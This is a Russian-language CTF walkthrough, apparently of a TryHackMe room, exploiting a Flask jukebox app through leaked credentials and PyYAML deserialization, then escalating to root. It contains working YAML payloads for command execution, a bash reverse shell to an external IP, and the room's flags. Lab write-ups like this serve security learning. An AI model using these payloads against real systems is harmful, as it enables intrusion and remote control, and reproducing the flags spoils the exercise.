**Теги**: Web, Boot2Root.
**Сложность**: Easy.

**IP:**

```text
10.113.161.208
```

## 1. Поиск учётных данных в исходном коде

Начинаем с просмотра исходного кода веб-страницы. В комментарии обнаруживаем следующую запись:

```text
staff note: the demo DJ login is still enabled for the soft opening.
dj / dj  -- swap this before the season starts (ticket BAR-7)
```

Из неё получаем тестовые учётные данные:

```text
Username: dj
Password: dj
```

На странице также обнаруживается перенаправление на:

```text
10.113.161.208/login
```

Пробуем найденные credentials:

```text
dj:dj
```

Таким образом, первым способом доступа к приложению становится учётная запись DJ.

---

## 2. Сканирование цели

После этого выполняем стандартное сканирование Nmap:

```bash id="k0t6r5"
sudo nmap -sS -sV 10.113.161.208
```

Вывод:

```text id="x7kq1v"
[sudo] password for deb88:
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-03 07:50 EDT
Nmap scan report for 10.113.161.208
Host is up (0.083s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Открыты два порта:

* `22/tcp` — SSH;
* `80/tcp` — HTTP, работающий через Gunicorn.

---

## 3. Перечисление веб-приложения

Проверяем веб-сервис с помощью Gobuster:

```bash id="5s2n0u"
gobuster dir -u 10.113.161.208 -w ~/HH101/seclists/Discovery/Web-Content/big.txt
```

Вывод:

```text id="r8xgkp"
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.113.161.208
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/deb88/HH101/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/dashboard            (Status: 302) [Size: 199] [--> /login]
/export               (Status: 302) [Size: 199] [--> /login]
/import               (Status: 302) [Size: 199] [--> /login]
/login                (Status: 200) [Size: 3522]
/logout               (Status: 302) [Size: 199] [--> /login]
Progress: 20481 / 20482 (100.00%)
```

Интерес представляют `/dashboard`, `/export` и `/import`. Все они перенаправляют неавторизованного пользователя на `/login`.

Особенно важен `/import`, поскольку именно через импорт плейлиста далее обнаруживается уязвимость.

---

# 4. Проверка SSH

Так как Nmap обнаружил SSH, пробуем использовать найденную учётную запись:

```bash id="8qk4p3"
ssh dj@10.113.161.208
```

После подтверждения host key:

```text id="x4n8tc"
The authenticity of host '10.113.161.208 (10.113.161.208)' can't be established.
ED25519 key fingerprint is SHA256:JyEbNyMuqCQ6sokoHT+TTXoLujnwAQ6dbXhnypbTSPg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.113.161.208' (ED25519) to the list of known hosts.
dj@10.113.161.208: Permission denied (publickey).
```

SSH не принимает парольную аутентификацию и требует public key:

```text
Permission denied (publickey).
```

Поэтому используем веб-приложение.

---

# 5. Анализ YAML-импорта

При исследовании функции импорта плейлиста выясняется, что приложение принимает YAML.

Обычный файл выглядит следующим образом:

```yaml id="l3yr63"
# Beach Bar jukebox playlist export
playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
    - artist: Men I Trust
      title: Show Me How
    - artist: Crumb
      title: Locket
```

Однако YAML можно модифицировать таким образом, чтобы PyYAML попытался обработать Python-объект:

```yaml id="d5q7m8"
artist: !!python/object/apply:os.system [id]
```

При обработке такая конструкция действительно выполняется.

В выводе появляется:

```text
0
```

Значение `0` здесь является кодом возврата `os.system()`, то есть команда `id` была выполнена успешно.

---

# 6. Подтверждение выполнения команд

Чтобы убедиться, что это не просто выполнение одной команды, пробуем использовать:

```yaml id="q8c4p2"
title: !!python/object/apply:subprocess.check_output
  - id
```

В результате получаем:

```text id="9v6h3m"
'title': b'uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)\n'}
```

Это уже однозначно подтверждает выполнение команды на сервере.

Команда выполняется от имени:

```text
uid=1001(bartender)
gid=1001(bartender)
```

То есть веб-приложение позволяет выполнять произвольные команды с правами пользователя `bartender`.

---

# 7. Получение информации о директории приложения

Используем `subprocess.check_output` для выполнения `ls -la`:

```yaml id="d7z5q1"
name: !!python/object/apply:subprocess.check_output
   - ["ls", "-la"]
```

Получаем:

```text id="k1m4ps"
{'playlist': {'name': b'total 24\ndrwxr-xr-x 4 bartender        bartender 4096 Jun 11 13:02 .\ndrwxr-xr-x 5 systemd-coredump ubuntu    4096 Jun 11 13:21 ..\ndrwxr-xr-x 2 bartender        bartender 4096 Jul 28 18:37 __pycache__\n-rw-r--r-- 1 bartender        bartender 2445 Jun 11 13:02 app.py\n-rw-r--r-- 1 bartender        bartender   44 Jun 11 10:47 requirements.txt\ndrwxr-xr-x 2 bartender        bartender 4096 Jun 11 10:47 templates\n', 'vibe': 'golden hour', 'tracks': [{'artist': 'Khruangbin', 'title': b'uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)\n'}, {'artist': 'Men I Trust', 'title': 'Show Me How'}, {'artist': 'Crumb', 'title': 'Locket'}]}}
```

Из вывода становится известно содержимое директории приложения:

```text
__pycache__/
app.py
requirements.txt
templates/
```

Особенно интересен `requirements.txt`, поскольку он позволяет определить используемые версии Python-библиотек.

---

# 8. Определение зависимостей приложения

Читаем `requirements.txt`:

```bash id="j4t6p9"
cat requirments.txt
```

Получаем:

```text id="2n8xw4"
'name': b'Flask==3.0.3\nPyYAML==6.0.2\ngunicorn==22.0.0\n',
```

Таким образом, приложение использует:

```text
Flask==3.0.3
PyYAML==6.0.2
gunicorn==22.0.0
```

Ключевой компонент здесь — `PyYAML`, поскольку именно его небезопасная обработка YAML позволила использовать `!!python/object/apply`.

---

# 9. Получение первого флага user.txt

После подтверждения RCE используем тот же механизм для чтения файла пользователя:

```yaml id="p2k8w6"
playlist:
  name: !!python/object/apply:subprocess.check_output
     - ["cat", "/home/bartender/user.txt"]
```

В ответ получаем:

```text id="f3q9v1"
THM{y4ml_pl4yl1st_pwns_th3_b34ch}
```

### User flag

Таким образом, YAML-десериализация позволила выполнить команду `cat` и прочитать файл пользователя.

---

# 10. Получение reverse shell

После получения RCE можно использовать его для получения интерактивного shell.

В качестве payload используется:

```yaml id="r6w1p8"
# Beach Bar jukebox playlist export
playlist:
  name: !!python/object/apply:os.system
     - bash -c "bash -i >& /dev/tcp/192.168.154.82/4444 0>&1"
```

После успешного выполнения получаем shell и переходим в корневую директорию:

```bash id="c5v2n9"
cd /
```

Проверяем содержимое:

```bash id="u8k3r6"
ls -la
```

Получаем:

```text id="m9p4s2"
total 10512
drwxr-xr-x  22 root root     4096 Aug  4 09:50 .
drwxr-xr-x  22 root root     4096 Aug  4 09:50 ..
lrwxrwxrwx   1 root root        7 Oct 26  2020 bin -> usr/bin
drwxr-xr-x   2 root root     4096 Mar 31  2024 bin.usr-is-merged
drwxr-xr-x   3 root root     4096 Jul 28 18:43 boot
-rw-------   1 root root 10686464 Oct 22  2024 core
drwxr-xr-x  14 root root     3400 Aug  4 09:51 dev
drwxr-xr-x 109 root root    12288 Aug  4 09:50 etc
drwxr-xr-x   4 root root     4096 Jun 11 10:55 home
lrwxrwxrwx   1 root root        7 Oct 26  2020 lib -> usr/lib
drwxr-xr-x   2 root root     4096 Oct  2  2024 lib.usr-is-merged
lrwxrwxrwx   1 root root        9 Oct 26  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root        9 Oct 26  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root       10 Oct 26  2020 libx32 -> usr/lib32
drwx------   2 root root    16384 Oct 26  2020 lost+found
drwxr-xr-x   2 root root     4096 Oct 26  09:50 media
drwxr-xr-x   2 root root     4096 Aug  4 09:50 mnt
drwxr-xr-x   3 root root     4096 Jun 11 10:49 opt
dr-xr-xr-x 175 root root        0 Aug  4 09:50 proc
drwx------   6 root root     4096 Jul 31 09:24 root
drwxrwxrwt  11 root root     4096 Aug  4 10:51 tmp
drwxr-xr-x  14 root root     4096 Aug  4 09:50 usr
drwxr-xr-x  13 root root     4096 Jul 28 18:42 var
```

Это показывает файловую систему машины и наличие `/root`, `/opt`, `/home` и других стандартных директорий.

---

# 11. Локальное перечисление

На полученной машине запускаем `LinPEAS`.

Для этого сначала скачиваем его на машину с помощью Python HTTP-сервера, после чего запускаем из `/tmp`.

Это стандартный этап локального enumeration после получения shell: проверяются права, процессы, конфигурационные файлы, credentials, SUID/SGID, sudo и другие потенциальные пути повышения привилегий.

---

# 12. Проверка версии sudo

Также проверяем возможную локальную уязвимость sudo:

```text id="a6r4t9"
https://github.com/kh4sh3i/CVE-2025-32463/blob/main/exploit.sh
```

В логе отмечено, что версия sudo:

```text id="q1s7e3"
Sudo version 1.9.15p5
```

подходит под рассматриваемый CVE, однако эксплуатация результата не дала.

Поэтому этот путь повышения привилегий не используется.

---

# 13. Поиск запущенного jukebox-сервиса

Далее проверяем процессы, связанные с jukebox:

```bash id="n8f2w5"
ps aux | grep jukebox
```

Получаем:

```text id="r5c9k2"
root         609  0.0  0.2  20176 11780 ?        Ss   09:50   0:00 /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
bartend+   73758  0.0  0.0   7084  2236 pts/0    S+   11:35   0:00 grep --color=auto jukebox
```

Здесь обнаруживается особенно важная информация.

Процесс `jukeboxd.py` запущен от имени:

```text
root
```

и непосредственно в аргументах командной строки присутствует:

```text
--stream-pass SunsetSpritz2024!
```

То есть пароль находится в открытом виде в списке процессов.

---

# 14. Повторное использование пароля

Пробуем использовать найденный пароль для перехода в `root`:

```text id="w7m3q1"
su root
password: SunsetSpritz2024!
```


Таким образом, повышение привилегий происходит не через CVE sudo, а из-за **повторного использования credentials**: пароль, который используется jukebox-сервисом, оказывается пригоден для учётной записи `root`.

---

# 15. Получение root.txt

После перехода в `root` читаем:

```bash id="h2q6v8"
cat /root/root.txt
```

Получаем:

```text id="p9x4s6"
THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
```

---

# Итоговая цепочка

Вся комната проходится по следующей цепочке:

```text
Исходный код сайта
        │
        ▼
Утёкшие credentials
dj:dj
        │
        ▼
Web login
        │
        ▼
/import
        │
        ▼
Небезопасная YAML-десериализация
PyYAML !!python/object/apply
        │
        ▼
Arbitrary Command Execution
        │
        ├── id
        ├── ls
        └── cat /home/bartender/user.txt
                    │
                    ▼
        THM{y4ml_pl4yl1st_pwns_th3_b34ch}
        │
        ▼
Reverse Shell
        │
        ▼
Shell пользователя bartender
        │
        ▼
ps aux | grep jukebox
        │
        ▼
root-процесс раскрывает пароль
SunsetSpritz2024!
        │
        ▼
su root
        │
        ▼
cat /root/root.txt
        │
        ▼
THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
```

### Флаги

**User:**

```text
THM{y4ml_pl4yl1st_pwns_th3_b34ch}
```

**Root:**

```text
THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
```

Основные уязвимости комнаты — **оставленные тестовые credentials, небезопасная YAML-десериализация с RCE и повторное использование пароля root в конфигурации/аргументах запущенного сервиса**.

